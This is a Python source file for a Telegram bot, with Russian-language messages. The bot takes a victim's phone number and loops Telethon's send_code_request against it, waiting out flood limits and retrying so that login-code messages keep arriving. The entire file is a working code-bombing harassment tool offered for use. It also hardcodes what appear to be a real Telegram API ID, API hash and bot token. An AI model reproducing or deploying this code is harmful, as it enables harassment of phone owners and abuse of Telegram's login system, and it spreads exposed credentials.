import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telethon import TelegramClient
from telethon.errors import FloodWaitError, PhoneNumberInvalidError

API_ID = 35911533
API_HASH = "11dafcdc1514796c867055023716d39a"
BOT_TOKEN = "8830187981:AAGZu4sKhuTpTSI8sPgliF2lvXYJotP1k1s"

spam_tasks = {}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Отправь номер телефона в формате +7XXXXXXXXXX или +380XXXXXXXXX для спама кодами.")

async def stop_spam(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id in spam_tasks:
        task, client = spam_tasks.pop(chat_id)
        if not task.done():
            task.cancel()
            try:
                await task
            except asyncio.CancelledError:
                pass
        await client.disconnect()
        await update.message.reply_text("Спам остановлен.")
    else:
        await update.message.reply_text("Нет активного спама.")

async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text.strip()
    chat_id = update.effective_chat.id
    if chat_id in spam_tasks:
        await update.message.reply_text("Уже идет спам для этого чата.")
        return

    client = TelegramClient(None, API_ID, API_HASH)
    await client.connect()

    async def spam():
        count = 0
        try:
            while True:
                try:
                    await client.send_code_request(phone)
                    count += 1
                    await context.bot.send_message(chat_id, f"Отправлен код #{count} на номер {phone}")
                except FloodWaitError as e:
                    await context.bot.send_message(chat_id, f"FloodWait: ждём {e.seconds} сек.")
                    await asyncio.sleep(e.seconds)
                    continue
                except Exception as e:
                    err_msg = str(e)
                    if "all available options" in err_msg or "ResendCodeRequest" in err_msg:
                        await context.bot.send_message(chat_id, f"Ошибка: все методы использованы, пробуем повторно через 10 сек.")
                        await asyncio.sleep(10)
                        continue
                    else:
                        await context.bot.send_message(chat_id, f"Ошибка: {e}")
                        break
                await asyncio.sleep(2)
        except asyncio.CancelledError:
            await client.disconnect()
            raise
        finally:
            spam_tasks.pop(chat_id, None)
            await client.disconnect()

    task = asyncio.create_task(spam())
    spam_tasks[chat_id] = (task, client)
    await update.message.reply_text("Запущен спам кодами. Для остановки отправь /stop")

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stop", stop_spam))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_phone))
    app.run_polling()

if __name__ == "__main__":
    main()
